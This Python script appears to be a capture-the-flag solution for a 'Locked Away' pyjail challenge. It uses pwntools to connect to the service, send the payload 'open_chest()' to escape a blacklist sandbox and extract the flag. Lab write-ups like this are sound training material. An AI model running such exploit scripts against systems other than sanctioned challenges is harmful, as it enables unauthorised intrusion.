#!/usr/bin/env python3
"""
Locked Away CTF Challenge - Solution Script

This script exploits a Python sandbox escape vulnerability by calling
the open_chest() function that's already in the global scope.

Target: Port 1337
Category: Misc / Jail
Vulnerability: Insufficient blacklist filtering

Author: CTF Team
Date: 2025
"""

from pwn import *
import sys

# Colors for output
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def print_banner():
    """Print solution banner"""
    print("=" * 60)
    print(f"{Colors.HEADER}Locked Away CTF Challenge - Exploit{Colors.ENDC}")
    print("=" * 60)
    print(f"Vulnerability: Python Sandbox Escape")
    print(f"Method: Direct function call")
    print("=" * 60)
    print()

def exploit_jail(host, port):
    """
    Exploit the Python jail by calling open_chest() directly
    
    Args:
        host (str): Target hostname or IP
        port (int): Target port
        
    Returns:
        str: The flag or None on failure
    """
    print(f"{Colors.OKBLUE}[*] Target: {host}:{port}{Colors.ENDC}")
    print(f"{Colors.OKCYAN}[*] Connecting...{Colors.ENDC}")
    
    try:
        # Connect to the service
        conn = remote(host, port)
        
        # Receive the banner
        banner = conn.recvuntil(b'waiting... ', timeout=5)
        print(f"{Colors.OKBLUE}[*] Received banner{Colors.ENDC}")
        
        # Send the exploit payload
        payload = b'open_chest()\n'
        print(f"{Colors.OKCYAN}[*] Sending payload: {payload.decode().strip()}{Colors.ENDC}")
        conn.sendline(payload)
        
        # Receive the flag
        response = conn.recvall(timeout=2).decode()
        
        conn.close()
        
        # Check if we got the flag
        if 'HTB{' in response or 'FLAG{' in response or 'flag{' in response:
            return response.strip()
        else:
            print(f"{Colors.WARNING}[!] Unexpected response: {response[:100]}{Colors.ENDC}")
            return response.strip()
            
    except EOFError:
        print(f"{Colors.FAIL}[!] Connection closed unexpectedly{Colors.ENDC}")
        return None
    except Exception as e:
        print(f"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}")
        return None

def main():
    """Main exploitation flow"""
    print_banner()
    
    # Parse command line arguments
    if len(sys.argv) < 3:
        print(f"{Colors.WARNING}Usage: {sys.argv[0]} <host> <port>{Colors.ENDC}")
        print(f"Example: {sys.argv[0]} localhost 1337")
        print(f"Example: {sys.argv[0]} target.htb 1337")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    
    # Execute the exploit
    result = exploit_jail(host, port)
    
    if result:
        print()
        print("=" * 60)
        print(f"{Colors.OKGREEN}{Colors.BOLD}[+] SUCCESS! Output:{Colors.ENDC}")
        print("=" * 60)
        print(result)
        print("=" * 60)
        
        # Extract flag if present
        if 'HTB{' in result:
            flag_start = result.index('HTB{')
            flag_end = result.index('}', flag_start) + 1
            flag = result[flag_start:flag_end]
            print(f"{Colors.OKGREEN}{Colors.BOLD}[+] FLAG: {flag}{Colors.ENDC}")
        
        return 0
    else:
        print()
        print(f"{Colors.FAIL}[!] Exploitation failed{Colors.ENDC}")
        print(f"{Colors.WARNING}[!] Troubleshooting:{Colors.ENDC}")
        print(f"    - Check target is reachable: nc -zv {host} {port}")
        print(f"    - Verify challenge is running")
        print(f"    - Try manual connection: nc {host} {port}")
        return 1

if __name__ == "__main__":
    sys.exit(main())
